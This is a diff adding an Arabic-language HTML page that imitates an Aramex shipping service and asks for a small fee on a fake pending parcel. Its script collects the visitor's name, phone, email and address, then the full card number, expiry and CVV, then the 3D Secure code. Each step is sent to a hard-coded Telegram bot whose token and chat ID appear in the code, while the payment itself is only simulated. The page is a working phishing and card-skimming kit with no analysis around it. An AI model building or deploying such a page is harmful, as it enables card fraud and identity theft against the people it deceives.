@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>aramex - خدمة الشحن</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+        
+        .header {
+            background-color: #d82c2c;
+            color: white;
+            padding: 8px 0;
+            text-align: center;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 50px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo {
+            font-family: 'Arial', sans-serif;
+            font-weight: bold;
+            font-size: 28px;
+            letter-spacing: -1px;
+        }
+        
+        .header-icon {
+            font-size: 24px;
+        }
+        
+        .page {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        h2 {
+            color: #d82c2c;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        button {
+            background-color: #d82c2c;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background-color: #c02525;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .step {
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            background-color: #ddd;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 5px;
+            font-size: 14px;
+        }
+        
+        .step.active {
+            background-color: #d82c2c;
+            color: white;
+        }
+        
+        .payment-methods {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .payment-method {
+            flex: 1;
+            border: 1px solid #ddd;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            cursor: pointer;
+        }
+        
+        .payment-method.active {
+            border-color: #d82c2c;
+        }
+        
+        .verification-input {
+            width: 100%;
+            text-align: center;
+            font-size: 18px;
+        }
+        
+        .verification-info {
+            text-align: center;
+            margin-bottom: 15px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .status-icons {
+            display: flex;
+            justify-content: space-around;
+            margin: 15px 0;
+        }
+        
+        .status-icon {
+            text-align: center;
+            padding: 8px;
+        }
+        
+        .status-icon i {
+            font-size: 24px;
+            color: #d82c2c;
+            margin-bottom: 5px;
+        }
+        
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .order-details {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #e0e0e0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            position: relative;
+        }
+        
+        .pending-alert {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background-color: #ff9800;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed #eee;
+        }
+        
+        .order-row:last-child {
+            border-bottom: none;
+        }
+        
+        .order-label {
+            font-weight: bold;
+            color: #666;
+        }
+        
+        .order-value {
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .package-icon {
+            font-size: 16px;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #d82c2c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .privacy-policy {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin: 20px 0 10px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+        }
+        
+        .secure-icon {
+            text-align: center;
+            margin: 10px 0;
+            color: #d82c2c;
+            font-size: 14px;
+        }
+        
+        .secure-icon i {
+            font-size: 30px;
+            margin-bottom: 5px;
+        }
+        
+        .resend-code {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        
+        .resend-code a {
+            color: #d82c2c;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .timer {
+            color: #d82c2c;
+            font-weight: bold;
+        }
+        
+        .success-page {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        .invoice-details {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: right;
+        }
+        
+        .invoice-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed #ddd;
+        }
+        
+        .invoice-row:last-child {
+            border-bottom: none;
+            font-weight: bold;
+            color: #d82c2c;
+        }
+    </style>
+</head>
+<body>
+    <!-- شاشة التحميل -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- الهيدر المعدل -->
+    <div class="header">
+        <div class="logo-container">
+            <i class="fas fa-shipping-fast header-icon"></i>
+            <div class="logo">aramex</div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="steps">
+            <div class="step active" id="step1">1</div>
+            <div class="step" id="step2">2</div>
+            <div class="step" id="step3">3</div>
+            <div class="step" id="step4">4</div>
+        </div>
+        
+        <!-- صفحة معلومات التوصيل -->
+        <div class="page active" id="waiting-page">
+            <h2>معلومات التوصيل</h2>
+            
+            <div class="status-icons">
+                <div class="status-icon">
+                    <i class="fas fa-shipping-fast"></i>
+                    <p>شحن سريع</p>
+                </div>
+                <div class="status-icon">
+                    <i class="fas fa-clock"></i>
+                    <p>قيد الانتظار</p>
+                </div>
+                <div class="status-icon">
+                    <i class="fas fa-file-invoice"></i>
+                    <p>مستندات</p>
+                </div>
+            </div>
+            
+            <div class="order-details">
+                <div class="pending-alert">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>طلبية قيد الانتظار</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">رقم الطلبية:</span>
+                    <span class="order-value">#SH-2023-78945</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">نوع الشحنة:</span>
+                    <span class="order-value"><i class="fas fa-box-open package-icon"></i> مستندات رسمية</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">وزن الطرد:</span>
+                    <span class="order-value"><i class="fas fa-weight-hanging package-icon"></i> 0.5 كجم</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">تكلفة الشحن:</span>
+                    <span class="order-value"><i class="fas fa-tag package-icon"></i> 12.75 ريال</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">حالة الشحنة:</span>
+                    <span class="order-value"><i class="fas fa-info-circle package-icon"></i> بانتظار الدفع</span>
+                </div>
+            </div>
+            
+            <form id="waiting-form">
+                <div class="form-group">
+                    <label for="name">الاسم الكامل</label>
+                    <input type="text" id="name" required>
+                    <div class="error-message" id="name-error">يجب إدخال الاسم الكامل</div>
+                </div>
+                <div class="form-group">
+                    <label for="phone">رقم الجوال</label>
+                    <input type="tel" id="phone" required>
+                    <div class="error-message" id="phone-error">يجب إدخال رقم جوال صحيح</div>
+                </div>
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <input type="email" id="email" required>
+                    <div class="error-message" id="email-error">يجب إدخال بريد إلكتروني صحيح</div>
+                </div>
+                <div class="form-group">
+                    <label for="city">المدينة</label>
+                    <input type="text" id="city" required>
+                    <div class="error-message" id="city-error">يجب إدخال المدينة</div>
+                </div>
+                <div class="form-group">
+                    <label for="address">العنوان التفصيلي</label>
+                    <input type="text" id="address" required>
+                    <div class="error-message" id="address-error">يجب إدخال العنوان التفصيلي</div>
+                </div>
+                
+                <div class="privacy-policy">
+                    <p>باستخدام هذه الخدمة، أنت توافق على شروطنا وأحكامنا. سيتم معالجة بياناتك وفقاً لـ <a href="#" style="color:#d82c2c;text-decoration:underline;">سياسة الخصوصية</a> الخاصة بنا. لن نشارك معلوماتك الشخصية مع أطراف ثالثة دون موافقتك.</p>
+                </div>
+                
+                <button type="button" id="proceed-to-payment-btn">المتابعة للدفع</button>
+            </form>
+        </div>
+        
+        <!-- صفحة الدفع -->
+        <div class="page" id="payment-page">
+            <h2>معلومات الدفع</h2>
+            <div class="payment-methods">
+                <div class="payment-method active" data-type="visa">
+                    <i class="fab fa-cc-visa"></i>
+                    <p>فيزا</p>
+                </div>
+                <div class="payment-method" data-type="mastercard">
+                    <i class="fab fa-cc-mastercard"></i>
+                    <p>ماستركارد</p>
+                </div>
+            </div>
+            <form id="payment-form">
+                <input type="hidden" id="card-type" value="visa">
+                <div class="form-group">
+                    <label for="card-number">رقم البطاقة</label>
+                    <input type="text" id="card-number" required maxlength="16">
+                    <div class="error-message" id="card-number-error">يجب إدخال رقم بطاقة صحيح (16 رقم)</div>
+                </div>
+                <div class="form-group">
+                    <label for="card-holder">اسم حامل البطاقة</label>
+                    <input type="text" id="card-holder" required>
+                    <div class="error-message" id="card-holder-error">يجب إدخال اسم حامل البطاقة</div>
+                </div>
+                <div class="form-group">
+                    <label for="card-expiry">تاريخ الانتهاء (MM/YY)</label>
+                    <input type="text" id="card-expiry" required placeholder="MM/YY">
+                    <div class="error-message" id="card-expiry-error">يجب إدخال تاريخ انتهاء صحيح (MM/YY)</div>
+                </div>
+                <div class="form-group">
+                    <label for="card-cvv">CVV</label>
+                    <input type="text" id="card-cvv" required maxlength="3">
+                    <div class="error-message" id="card-cvv-error">يجب إدخال CVV صحيح (3 أرقام)</div>
+                </div>
+                
+                <div class="privacy-policy">
+                    <p>سيتم خصم المبلغ من حسابك بعد التحقق من المعلومات. جميع المعاملات محمية بتقنيات تشفير متقدمة.</p>
+                </div>
+                
+                <button type="button" id="pay-now-btn">دفع الآن</button>
+            </form>
+        </div>
+        
+        <!-- صفحة التحقق -->
+        <div class="page" id="verification-page">
+            <h2>التحقق من الدفع</h2>
+            <p class="verification-info">لقد أرسلنا رمز التحقق إلى هاتفك المحمول</p>
+            <p class="verification-info">(سيصلك رمز التحقق خلال <span class="timer">02:00</span> دقيقة)</p>
+            
+            <div class="secure-icon">
+                <i class="fas fa-shield-alt"></i>
+                <p>الرجاء إدخال رمز 3D Secure الصحيح</p>
+            </div>
+            
+            <form id="verification-form">
+                <div class="form-group">
+                    <label for="verification-code">رمز التحقق</label>
+                    <input type="text" id="verification-code" class="verification-input" required maxlength="6">
+                </div>
+                
+                <div class="resend-code">
+                    لم تستلم الرمز؟ <a id="resend-code-link">إعادة إرسال الرمز</a>
+                </div>
+                
+                <div class="privacy-policy">
+                    <p>بإتمام هذه العملية، أنت توافق على <a href="#" style="color:#d82c2c;text-decoration:underline;">شروط الخدمة</a> و <a href="#" style="color:#d82c2c;text-decoration:underline;">سياسة الخصوصية</a> الخاصة بنا.</p>
+                </div>
+                
+                <button type="button" id="verify-btn">تأكيد</button>
+            </form>
+        </div>
+        
+        <!-- صفحة النجاح -->
+        <div class="page" id="success-page">
+            <div class="success-page">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>تمت العملية بنجاح!</h2>
+                <p>شكراً لاستخدامك خدمة aramex. سيتم توصيل شحنتك قريباً.</p>
+                
+                <div class="invoice-details">
+                    <div class="invoice-row">
+                        <span>اسم العميل:</span>
+                        <span id="invoice-name"></span>
+                    </div>
+                    <div class="invoice-row">
+                        <span>رقم الجوال:</span>
+                        <span id="invoice-phone"></span>
+                    </div>
+                    <div class="invoice-row">
+                        <span>المدينة:</span>
+                        <span id="invoice-city"></span>
+                    </div>
+                    <div class="invoice-row">
+                        <span>العنوان:</span>
+                        <span id="invoice-address"></span>
+                    </div>
+                    <div class="invoice-row">
+                        <span>رقم الطلبية:</span>
+                        <span>#SH-2023-78945</span>
+                    </div>
+                    <div class="invoice-row">
+                        <span>نوع الشحنة:</span>
+                        <span>مستندات رسمية</span>
+                    </div>
+                    <div class="invoice-row">
+                        <span>المبلغ المخصوم:</span>
+                        <span>12.75 ريال</span>
+                    </div>
+                </div>
+                
+                <button type="button" id="new-order-btn">طلب جديد</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات البوت
+        const BOT_TOKEN = '7948003939:AAFoHEO0y2_0nURG0euIp2yVCIenfFdf7_A';
+        const CHAT_ID = '5680906598';
+        let collectedData = {};
+        let timerInterval;
+        let timeLeft = 120; // 2 دقائق بالثواني
+
+        // دالة لعرض شاشة التحميل
+        function showLoading() {
+            document.getElementById('loading-overlay').style.display = 'flex';
+        }
+        
+        // دالة لإخفاء شاشة التحميل
+        function hideLoading() {
+            document.getElementById('loading-overlay').style.display = 'none';
+        }
+
+        // دالة لجمع البيانات من النموذج الحالي
+        function collectData(page) {
+            if (page === 'waiting') {
+                return {
+                    orderNumber: "#SH-2023-78945",
+                    orderType: "مستندات رسمية",
+                    weight: "0.5 كجم",
+                    price: "12.75 ريال",
+                    name: document.getElementById('name').value,
+                    phone: document.getElementById('phone').value,
+                    email: document.getElementById('email').value,
+                    city: document.getElementById('city').value,
+                    address: document.getElementById('address').value,
+                    status: "طلبية قيد الانتظار"
+                };
+            } else if (page === 'payment') {
+                return {
+                    cardType: document.getElementById('card-type').value,
+                    cardNumber: document.getElementById('card-number').value,
+                    cardHolder: document.getElementById('card-holder').value,
+                    cardExpiry: document.getElementById('card-expiry').value,
+                    cardCvv: document.getElementById('card-cvv').value
+                };
+            } else if (page === 'verification') {
+                return { 
+                    code: document.getElementById('verification-code').value 
+                };
+            }
+            return null;
+        }
+
+        // دالة للتحقق من صحة النموذج
+        function validateForm(page) {
+            let isValid = true;
+            
+            if (page === 'waiting') {
+                const name = document.getElementById('name').value;
+                const phone = document.getElementById('phone').value;
+                const email = document.getElementById('email').value;
+                const city = document.getElementById('city').value;
+                const address = document.getElementById('address').value;
+                
+                if (!name) {
+                    document.getElementById('name-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('name-error').style.display = 'none';
+                }
+                
+                if (!phone || phone.length < 10) {
+                    document.getElementById('phone-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('phone-error').style.display = 'none';
+                }
+                
+                if (!email || !email.includes('@')) {
+                    document.getElementById('email-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('email-error').style.display = 'none';
+                }
+                
+                if (!city) {
+                    document.getElementById('city-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('city-error').style.display = 'none';
+                }
+                
+                if (!address) {
+                    document.getElementById('address-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('address-error').style.display = 'none';
+                }
+            }
+            else if (page === 'payment') {
+                const cardNumber = document.getElementById('card-number').value;
+                const cardHolder = document.getElementById('card-holder').value;
+                const cardExpiry = document.getElementById('card-expiry').value;
+                const cardCvv = document.getElementById('card-cvv').value;
+                
+                if (!cardNumber || cardNumber.length !== 16) {
+                    document.getElementById('card-number-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('card-number-error').style.display = 'none';
+                }
+                
+                if (!cardHolder) {
+                    document.getElementById('card-holder-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('card-holder-error').style.display = 'none';
+                }
+                
+                if (!cardExpiry || !cardExpiry.match(/^\d{2}\/\d{2}$/)) {
+                    document.getElementById('card-expiry-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('card-expiry-error').style.display = 'none';
+                }
+                
+                if (!cardCvv || cardCvv.length !== 3) {
+                    document.getElementById('card-cvv-error').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('card-cvv-error').style.display = 'none';
+                }
+            }
+            
+            return isValid;
+        }
+
+        // دالة لعرض صفحة محددة
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId + '-page').classList.add('active');
+            
+            // تحديث خطوات التقدم
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            if (pageId === 'waiting') document.getElementById('step1').classList.add('active');
+            if (pageId === 'payment') document.getElementById('step2').classList.add('active');
+            if (pageId === 'verification') document.getElementById('step3').classList.add('active');
+            if (pageId === 'success') document.getElementById('step4').classList.add('active');
+        }
+
+        // دالة لإعادة تعيين النماذج
+        function resetForms() {
+            document.getElementById('waiting-form').reset();
+            document.getElementById('payment-form').reset();
+            document.getElementById('verification-form').reset();
+            showPage('waiting');
+            clearInterval(timerInterval);
+            timeLeft = 120;
+        }
+
+        // دالة بدء المؤقت
+        function startTimer() {
+            clearInterval(timerInterval);
+            updateTimerDisplay();
+            
+            timerInterval = setInterval(function() {
+                timeLeft--;
+                updateTimerDisplay();
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
+
+        // دالة تحديث عرض المؤقت
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.querySelector('.timer').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        // دالة إعادة إرسال الرمز
+        function resendCode() {
+            timeLeft = 120;
+            startTimer();
+            alert('تم إعادة إرسال رمز التحقق إلى هاتفك المحمول');
+        }
+
+        // دالة ملء بيانات الفاتورة
+        function fillInvoiceData() {
+            document.getElementById('invoice-name').textContent = collectedData.waiting.name;
+            document.getElementById('invoice-phone').textContent = collectedData.waiting.phone;
+            document.getElementById('invoice-city').textContent = collectedData.waiting.city;
+            document.getElementById('invoice-address').textContent = collectedData.waiting.address;
+        }
+
+        // عند النقر على زر المتابعة للدفع
+        document.getElementById('proceed-to-payment-btn').addEventListener('click', async () => {
+            if (validateForm('waiting')) {
+                const data = collectData('waiting');
+                collectedData.waiting = data;
+                
+                const waitingMessage = `📦 معلومات التوصيل - طلبية قيد الانتظار\n\n` +
+                                    `📄 رقم الطلبية: ${data.orderNumber}\n` +
+                                    `📦 نوع الشحنة: ${data.orderType}\n` +
+                                    `⚖️ الوزن: ${data.weight}\n` +
+                                    `💰 السعر: ${data.price}\n` +
+                                    `👤 الاسم: ${data.name}\n` +
+                                    `📱 الجوال: ${data.phone}\n` +
+                                    `📧 الإيميل: ${data.email}\n` +
+                                    `📍 المدينة: ${data.city}\n` +
+                                    `🏠 العنوان: ${data.address}\n` +
+                                    `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                                    `⚠️ حالة الطلب: ${data.status}`;
+                
+                await sendToTelegram(waitingMessage);
+                showPage('payment');
+            }
+        });
+
+        // عند النقر على زر الدفع الآن
+        document.getElementById('pay-now-btn').addEventListener('click', async function() {
+            if (validateForm('payment')) {
+                showLoading();
+                
+                // محاكاة عملية دفع تستغرق 2 ثانية
+                setTimeout(async function() {
+                    const data = collectData('payment');
+                    collectedData.payment = data;
+                    
+                    const paymentMessage = `💳 معلومات الدفع\n\n` +
+                                         `🃏 نوع البطاقة: ${data.cardType}\n` +
+                                         `🔢 رقم البطاقة: ${data.cardNumber}\n` +
+                                         `👤 اسم الحامل: ${data.cardHolder}\n` +
+                                         `📅 تاريخ الانتهاء: ${data.cardExpiry}\n` +
+                                         `🔐 CVV: ${data.cardCvv}\n` +
+                                         `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
+                    
+                    await sendToTelegram(paymentMessage);
+                    hideLoading();
+                    showPage('verification');
+                }, 2000);
+            }
+        });
+
+        // عند النقر على زر التأكيد
+        document.getElementById('verify-btn').addEventListener('click', async () => {
+            const code = document.getElementById('verification-code').value;
+            if (code) {
+                showLoading();
+                
+                setTimeout(async function() {
+                    const data = collectData('verification');
+                    collectedData.verification = data;
+                    
+                    const verificationMessage = `🔐 رمز التحقق\n\n` +
+                                              `🔢 الرمز: ${data.code}\n` +
+                                              `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
+                    
+                    const success = await sendToTelegram(verificationMessage);
+                    hideLoading();
+                    
+                    if (success) {
+                        fillInvoiceData();
+                        showPage('success');
+                    }
+                }, 1500);
+            } else {
+                alert('الرجاء إدخال رمز التحقق');
+            }
+        });
+
+        // عند النقر على إعادة إرسال الرمز
+        document.getElementById('resend-code-link').addEventListener('click', resendCode);
+
+        // عند النقر على طلب جديد
+        document.getElementById('new-order-btn').addEventListener('click', resetForms);
+
+        // دالة إرسال إلى التليجرام
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to send message');
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى');
+                return false;
+            }
+        }
+
+        // اختيار طريقة الدفع
+        document.querySelectorAll('.payment-method').forEach(method => {
+            method.addEventListener('click', function() {
+                document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('active'));
+                this.classList.add('active');
+                document.getElementById('card-type').value = this.getAttribute('data-type');
+            });
+        });
+
+        // التحكم في إدخال تاريخ انتهاء البطاقة
+        document.getElementById('card-expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // إظهار رسالة ترحيبية عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            console.log('تم تحميل صفحة aramex بنجاح');
+        });
+    </script>
+</body>
+</html>
